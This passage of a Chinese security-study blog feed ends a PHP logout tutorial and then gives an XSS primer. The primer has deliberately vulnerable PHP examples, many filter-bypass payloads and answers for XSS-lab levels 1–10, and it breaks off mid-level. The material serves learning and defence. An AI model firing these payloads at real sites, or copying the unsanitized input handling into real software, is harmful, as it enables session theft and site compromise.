href="#注销账户-logout-php" class="headerlink" title="注销账户(logout.php)"></a>注销账户(logout.php)</h2><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><pre><code class="highlight plaintext">&lt;?phpsession_start();session_unset();session_destroy();header(&quot;Location: login.php&quot;);exit();?&gt;</code></pre><h3 id="学习-4"><a href="#学习-4" class="headerlink" title="学习"></a>学习</h3><ol><li><code>session_start();</code>: 开始或恢复会话。在使用会话功能之前，必须先调用此函数，以确保能够使用 <code>$_SESSION</code> 变量来存储和检索会话数据。</li><li><code>session_unset();</code>: 释放 <code>$_SESSION</code> 变量中的所有会话数据。这并不会结束会话，只是清空会话数据，以确保用户在下次访问时不再保持之前的会话状态。</li><li><code>session_destroy();</code>: 销毁会话。此函数会删除服务器上存储的会话文件，并且将会话 cookie 设置为过期。这意味着当前用户的会话已经结束，下次访问时将会创建一个新的会话。</li><li><code>header(&quot;Location: login.php&quot;);</code>: 发送一个原始的 HTTP 头信息，用于重定向浏览器到指定的 URL（在这里是 <code>login.php</code>）。这会告诉浏览器去访问新的页面。</li><li><code>exit();</code>: 立即终止脚本的执行。在这里，它确保在重定向之后不会执行任何额外的代码。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS入门</title>
      <link href="/2024/03/18/XSS%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/XSS%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS入门"><a href="#XSS入门" class="headerlink" title="XSS入门"></a>XSS入门</h1><h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><p><strong>推荐文章：<a href="https://xz.aliyun.com/t/12370?time__1311=mqmhD57KAIe+OxBqDTnxUOznD88evwPx&alichlgref=https://xz.aliyun.com/t/12370#tdsub">对于XSS跨站脚本攻击的学习 - 先知社区 (aliyun.com)</a></strong></p><p>原理文章：<a href="https://xz.aliyun.com/t/12890?time__1311=mqmhq+xjhiGKDsD7GY0=bDtRhbpWiYeD&alichlgref=https://www.google.com.hk/">https://xz.aliyun.com/t/12890?time__1311=mqmhq%2BxjhiGKDsD7GY0%3DbDtRhbpWiYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><pre><code class="highlight plaintext">跨站脚本攻击（Cross-Site Scripting，XSS）是一种常见的Web安全漏洞，攻击者通过在受害者的浏览器中注入恶意脚本来执行恶意行为。这种攻击通常利用Web应用程序没有对用户输入的数据进行足够的过滤和验证。</code></pre><h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><pre><code class="highlight plaintext">XSS跨站脚本攻击的原理是利用Web应用程序对用户输入数据的不足过滤和验证，将恶意脚本注入到受害者的浏览器中，使其在浏览器中执行。攻击者通常会将恶意脚本嵌入到Web页面中的某个位置，比如输入框、评论框、搜索框等等，然后诱使用户访问这个被注入了恶意脚本的页面。当用户访问页面时，恶意脚本就会在用户的浏览器中被执行，从而执行攻击者预先设定好的恶意行为，比如窃取用户的Cookie信息、伪造用户的网站行为等等。</code></pre><h4 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h4><h5 id="储存型XSS"><a href="#储存型XSS" class="headerlink" title="储存型XSS"></a>储存型XSS</h5><p>将代码传输到后端进而到数据库进行储存，再特定情况下实现代码功能。</p><p>示例：</p><pre><code class="highlight php">&lt;form&gt;    &lt;p&gt;请输入您的评论：&lt;/p&gt;    &lt;textarea name=<span class="string">&quot;comment&quot;</span>&gt;&lt;/textarea&gt;    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;  &lt;/form&gt;  <span class="meta">&lt;?php</span>    <span class="comment">// 处理评论表单的提交</span>    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;      <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>];      <span class="comment">// 将评论存储到数据库中</span>      <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (content) VALUES (&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;      <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);    &#125;  <span class="meta">?&gt;</span>  &lt;h2&gt;评论区&lt;/h2&gt;  &lt;ul&gt;    <span class="meta">&lt;?php</span>      <span class="comment">// 显示所有评论</span>      <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM comments&quot;</span>);      <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>)) &#123;        <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;content&#x27;</span>] . <span class="string">&quot;&lt;/li&gt;&quot;</span>;      &#125;    <span class="meta">?&gt;</span></code></pre><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><blockquote><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p><p>一般就是题目给一个<code>&lt;input&gt;</code>标签形成的输入框，然后我们在输入框里输入我们的恶意脚本，需要用户进行触发才能进行攻击，在前端输入恶意脚本，后端接受，然后再在前端显示，这也就是反射型XSS的数据流通。</p></blockquote><p>示例：</p><pre><code class="highlight php">&lt;form&gt;   &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span>&gt;   &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;p&gt;您好，<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]; <span class="meta">?&gt;</span>！&lt;/p&gt;</code></pre><h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><blockquote><p>不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><p>这种XSS攻击是不经过后端的，它也算是一种反射型XSS，但是它的数据流通过程比较简单，就是在前端url添加我们的恶意脚本，然后直接在页面输出了</p></blockquote><pre><code class="highlight plaintext">&lt;script&gt;   var query = window.location.search.substring(1);   var name = query.split(&quot;=&quot;)[1];   document.write(&quot;&lt;p&gt;Hello, &quot; + name + &quot;!&lt;/p&gt;&quot;); &lt;/script&gt;</code></pre><h5 id="JSONP-XSS"><a href="#JSONP-XSS" class="headerlink" title="JSONP XSS"></a>JSONP XSS</h5><p>参考文章：<a href="https://blog.csdn.net/tiancityycf/article/details/117675042">jsonp安全攻防技术（JSON劫持、XSS漏洞）_xss漏洞 json-CSDN博客</a></p><h3 id="XSS攻击点-插入点"><a href="#XSS攻击点-插入点" class="headerlink" title="XSS攻击点(插入点)"></a>XSS攻击点(插入点)</h3><h4 id="插入到HTML注释内容中"><a href="#插入到HTML注释内容中" class="headerlink" title="插入到HTML注释内容中"></a>插入到HTML注释内容中</h4><p>没见过，见过再补。</p><h4 id="插入到HTML标签属性值中"><a href="#插入到HTML标签属性值中" class="headerlink" title="插入到HTML标签属性值中"></a>插入到HTML标签属性值中</h4><p>示例：<code>&lt;img src=‘img.png’ onerror=“&lt;script&gt;alert(1)&lt;/script&gt;”&gt;</code></p><p>附：onerror属性值并不是简单的出现在网页上，而是会经过HTML和JavaScript语法。事实上，onerror是JavaScript的属性。</p><h4 id="插入到HTML标签属性名中"><a href="#插入到HTML标签属性名中" class="headerlink" title="插入到HTML标签属性名中"></a>插入到HTML标签属性名中</h4><p>没见过，见过再补。</p><h4 id="插入到HTML标签名中"><a href="#插入到HTML标签名中" class="headerlink" title="插入到HTML标签名中"></a>插入到HTML标签名中</h4><p>没见过，见过再补。</p><h4 id="插入到CSS中"><a href="#插入到CSS中" class="headerlink" title="插入到CSS中"></a>插入到CSS中</h4><p>示例：</p><pre><code class="highlight plaintext">&lt;div style=&quot;background-image:url(&#x27;javascript:alert(`Evi1s7`)&#x27;);&quot;&gt;</code></pre><h4 id="插入到HTTP响应中"><a href="#插入到HTTP响应中" class="headerlink" title="插入到HTTP响应中"></a>插入到HTTP响应中</h4><p>没见过，见过再补。</p><h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><h4 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h4><h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>示例(原理是第一点)：</p><pre><code class="highlight php"><span class="meta">&lt;?php</span>      <span class="variable">$q</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;      <span class="variable">$q</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$q</span>);     <span class="meta">?&gt;</span></code></pre><blockquote><p>以下是一些可能导致大小写绕过的情况和原理：</p><ol><li><strong>标签和属性名不区分大小写：</strong><ul><li>在HTML中，标签名和属性名是不区分大小写的。例如，<code>&lt;script&gt;</code> 和 <code>&lt;SCRIPT&gt;</code> 是等效的。攻击者可能会尝试使用不同大小写的标签和属性名，以绕过一些基于规则的过滤器。</li></ul></li><li><strong>JavaScript事件处理属性不区分大小写：</strong><ul><li>在HTML中，JavaScript事件处理属性（如<code>onclick</code>、<code>onmouseover</code>等）也是不区分大小写的。攻击者可以尝试使用大小写变体来绕过一些检测。</li></ul></li><li><strong>HTML实体编码绕过：</strong><ul><li>攻击者有时会使用HTML实体编码来混淆代码，以尝试绕过安全过滤。大小写变体可能会用于混淆这些实体编码，使其更难以识别。</li></ul></li><li><strong>混合大小写的JavaScript：</strong><ul><li>在JavaScript中，变量和函数名是区分大小写的，但攻击者可能尝试使用混合大小写的形式，使其更难以检测。</li></ul></li></ol></blockquote><h5 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h5><h6 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h6><p>函数解析</p><p>在 JavaScript 中，<code>eval()</code> 函数用于执行传递给它的字符串中的 JavaScript 代码。</p><p>语法：eval(codeString)</p><p>示例：</p><p><code>var x = 10;</code><br><code>var y = 20;</code><br><code>var codeString = &quot;x + y&quot;;</code><br><code>var result = eval(codeString);</code><br><code>console.log(result); // 输出 30</code></p><p>把eval的参数字符串当成运行代码即可</p><p>绕过示例</p><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;</code></pre><h6 id="window"><a href="#window" class="headerlink" title="window"></a>window</h6><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;</code></pre><blockquote><p>这段代码中 <code>window[&#39;alert&#39;](1)</code> 是使用 JavaScript 中的数组标记法（Array Bracket Notation）来调用 <code>window</code> 对象的 <code>alert</code> 方法。</p><p>在 JavaScript 中，<code>window</code> 是全局对象，而 <code>alert</code> 是 <code>window</code> 对象的一个方法，用于在浏览器中显示一个警告框，通常用于向用户显示一条消息。</p><p>在这里，<code>window[&#39;alert&#39;](1)</code> 实际上等同于 <code>window.alert(1)</code>。这行代码的作用是在浏览器中弹出一个警告框，显示数字 1。然而，需要注意的是，这样的代码常常被用于恶意目的，尤其是在尝试进行跨站脚本（XSS）攻击时，因此在实际开发中应该小心处理用户输入，以防止安全漏洞。</p></blockquote><p>其它与之类似的还有top，frame，window，self，parent等等。</p><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;</code></pre><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;</code></pre><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;</code></pre><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;</code></pre><h5 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h5><p>当一些函数被禁用时，可以替换为其他函数</p><pre><code class="highlight plaintext">&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;</code></pre><h5 id="嵌套绕过-双写绕过"><a href="#嵌套绕过-双写绕过" class="headerlink" title="嵌套绕过(双写绕过)"></a>嵌套绕过(双写绕过)</h5><pre><code class="highlight plaintext">&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre><p>没啥说的</p><h5 id="赋值绕过"><a href="#赋值绕过" class="headerlink" title="赋值绕过"></a>赋值绕过</h5><p>这个有点意思，用变量代替字符串，看例子：</p><pre><code class="highlight plaintext">&lt;img src onerror=_=alert,_(1)&gt;&lt;img src x=al y=ert onerror=top[x+y](1)&gt;&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</code></pre><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><h5 id="HTML实体编码和Unicode编码"><a href="#HTML实体编码和Unicode编码" class="headerlink" title="HTML实体编码和Unicode编码"></a>HTML实体编码和Unicode编码</h5><p>原理：</p><p>1.JavaScript引擎会将DOM文档的实体编码解码为原始字符，所以有些字符可以用实体编码代替</p><p>2.在正常情况下，JavaScript 引擎会正确解释和执行 Unicode 编码的字符。例如，下面的 JavaScript 代码将正确输出 “你好”：</p><pre><code class="highlight plaintext">javascriptCopy codeconsole.log(&#x27;\u4F60\u597D&#x27;)</code></pre><h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>示例：<code>&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;</code></p><p>原理：在 JavaScript 伪协议中，当使用 <code>javascript:</code> 开头的 URL，并且其中包含编码后的 JavaScript 代码时，浏览器在执行这个 URL 时，会先解码其中的百分号编码，然后再执行解码后的 JavaScript 代码。</p><h6 id="附：src和href的运用"><a href="#附：src和href的运用" class="headerlink" title="附：src和href的运用"></a>附：src和href的运用</h6><p>src：</p><p><code>&lt;script&gt;</code>标签</p><p><code>src</code>属性用于指定引入外部JavaScript文件的URL</p><p><code>&lt;img&gt;</code>标签</p><p><code>src</code>属性用于指定要显示的图像的URL</p><p><code>&lt;frame&gt;</code>标签</p><p><code>src</code>属性用于指定要嵌入的另一个文档的URL。</p><p><code>&lt;audio&gt;</code>和<code>&lt;video&gt;</code>标签</p><p><code>src</code>属性用于指定要播放的音频或视频的URL</p><p>href：</p><p><code>&lt;a&gt;</code>标签</p><p><code>href</code>属性用于指定链接目标的URL。</p><p><code>&lt;href&gt;</code>标签</p><p><code>href</code>属性用于指定外部样式表的URL。</p><p><code>&lt;base&gt;</code>标签</p><p><code>href</code>属性用于指定基准URL，所有相对URL都将以该URL为基础。</p><p><code>&lt;area&gt;</code>标签</p><p><code>href</code>属性用于指定图像地图中区域的URL。</p><h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><blockquote><p>在html的标签中的不同位置的空格绕过方式不是一样的</p><pre><code class="highlight plaintext">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;</code></pre><p>A位置： &#x2F;，&#x2F;123&#x2F;，%09，%0A，%0C，%0D，%20， &#x2F;**&#x2F;</p><p>B位置：%09，%0A，%0C，%0D，%20</p><p>C位置：%0B，&#x2F;**&#x2F; （如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20）</p><p>D位置：%09，%0A，%0C，%0D，%20，&#x2F;&#x2F;，&gt;</p></blockquote><h4 id="小括号-绕过"><a href="#小括号-绕过" class="headerlink" title="小括号()绕过"></a>小括号()绕过</h4><h5 id="利用反引号"><a href="#利用反引号" class="headerlink" title="利用反引号&#96;&#96;"></a>利用反引号&#96;&#96;</h5><p>示例：</p><pre><code class="highlight plaintext">&lt;script&gt;alert`1`&lt;/script&gt;</code></pre><h5 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h5><pre><code class="highlight plaintext">&lt;script&gt;alert;throw 1&lt;/script&gt;</code></pre><h4 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h4><h5 id="斜杠替换"><a href="#斜杠替换" class="headerlink" title="斜杠替换"></a>斜杠替换</h5><pre><code class="highlight plaintext">&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;</code></pre><h5 id="反引号替换"><a href="#反引号替换" class="headerlink" title="反引号替换"></a>反引号替换</h5><pre><code class="highlight plaintext">&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;</code></pre><h4 id="alert过滤"><a href="#alert过滤" class="headerlink" title="alert过滤"></a>alert过滤</h4><p>用其他函数替换</p><blockquote><p>prompt()</p><pre><code class="highlight plaintext">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre><p>confirm()</p><pre><code class="highlight plaintext">&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre><p>console.log()</p><pre><code class="highlight plaintext">&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre><p>document.write()</p><pre><code class="highlight plaintext">&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;</code></pre></blockquote><p>还可以利用编码绕过，JavaScript引擎会自动解码。</p><h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>当只过滤了分号时，可以利用花括号进行语句隔离</p><pre><code class="highlight plaintext">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;</code></pre><h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><blockquote><p>可以利用拆分法</p><pre><code class="highlight plaintext">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval(a)&lt;/script&gt;</code></pre><p>利用eval()函数将字符串解析为可执行的代码，从而进行拼接</p><pre><code class="highlight plaintext">document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)闯关</code></pre></blockquote><h2 id="XSS-LAB闯关"><a href="#XSS-LAB闯关" class="headerlink" title="XSS_LAB闯关"></a>XSS_LAB闯关</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>source：<code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code></p><p>语句：</p><ol><li><p><code>&lt;img src=&quot;&quot; onerror=alert(233)&gt;</code></p></li><li><p><code>&lt;input onclick=alert(233)&gt;</code> </p></li><li><p><code>&lt;sccript&gt;alert(1)&lt;/script&gt;</code></p></li></ol><p>须知：第二种注入以后刚开始可能会报错，再点一下输入框即可。</p><h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>source：</p><p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code></p><p>显然第一行的不可以，看看第二行。</p><p>语句：</p><ol><li><code>&quot;&gt; &lt;script&gt;alert(1)&lt;/script&gt;//</code></li><li><code>&quot; onclick=alert(1)&gt;//</code></li></ol><h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>source：</p><p><code>&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</code></p><p>须知：</p><blockquote><p>使用htmlspecialchars()函数对输入进行了处理，该函数会将双引号、小于号、大于号、&amp;符号转换为对应的HTML实体编码，但默认情况下并不会对单引号进行编码</p></blockquote><p>语句：</p><p><code>&#39; onclick=alert(1)//</code></p><p>附：因为htmlspecialchars()函数，所以用不了闭合插入法（哈哈，自己编的）。</p><h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>source：</p><p><code>$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p><p>由上可知大小于号又没了，只能用属性法了（没错，又是我自己编的）。</p><p>语句：</p><p><code>&quot; onclick=alert(1)//</code></p><h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p><p>全部小写，再来两个替换。</p><p>语句：</p><p> <code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;hi&lt;/a&gt;//</code></p><p>须知：</p><p>JavaScript伪协议：</p><p>伪协议不同于因特网上所真实存在的协议，而是为关联应用程序而使用的。</p><p>格式：javascript:······，通常在最后面加一句：void 0;</p><p>如果有多个语句需要用逗号分隔。</p><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>source：</p><p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p><p>限制很多·······，不过没有大小写转换，而HTML对大小写不敏感。</p><p>语句：</p><p><code>&quot;&gt;&lt;a HREF=javascript:alert(1)&gt;hi&lt;/a&gt;//</code></p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>source：</p><p><code>$str =strtolower( $_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p><p>大小于号不过滤都好写。</p><p>语句：</p><p><code>&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;//</code></p><p><code>&quot; oonnclick=alert(1)&gt;//</code></p><p><code>&quot;&gt;&lt;a hhrefref=javasscriptcript:alert(1)&gt;hi&lt;/a&gt;//</code></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</code></p><p> <code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code></p><p>须知：</p><p>在表单输入框里输入的数据会在url框里进行一次编码</p><p>url框里显示的数据中的汉字实际上在传输时会被url编码</p><p>语句：javascr%09ipt:alert(1)</p><p>须知：须在url框里，因为表单输入框会进行一次url编码，结果没有是空格的。其实在表单输入框里原样输入即可，但是空格输入后会变成加号。</p><p>分析：按照常理应该在input里搞事情，但是htmlspecialchars()函数阻止了该操作，但是可以在echo里操作。另外，虽然在代码中有水平制表符，但是不会影响，代码会忽略它。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>须知：</p><blockquote><p>在 HTML 中，无论字符串是否被单引号或双引号包裹，<code>javascript:</code> 伪协议依然会被浏览器解释并执行。引号的使用主要是用于区分 HTML 属性的开始和结束，而不会影响到伪协议的执行。</p></blockquote><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p><p><code>&lt;?php</code></p><p><code>if(false===strpos($str7,&#39;http://&#39;))&#123;</code> </p><p><code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code></p><p> <code>&#125;else&#123;</code></p><p> <code>echo &#39;&lt;center&gt;&lt;BR&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;&#125;?&gt;</code></p><p>语句：</p><p><code>javascr%09ipt:alert(1)//http://</code><br><code>javasc%09ript:alert(&#39;http://&#39;);</code></p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>source：</p><p><code>$str11 = $_GET[&quot;t_sort&quot;];</code></p><p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p><p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p><p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p><p>语句：</p><p><code>t_sort=&quot;  type=&quot;text&quot; 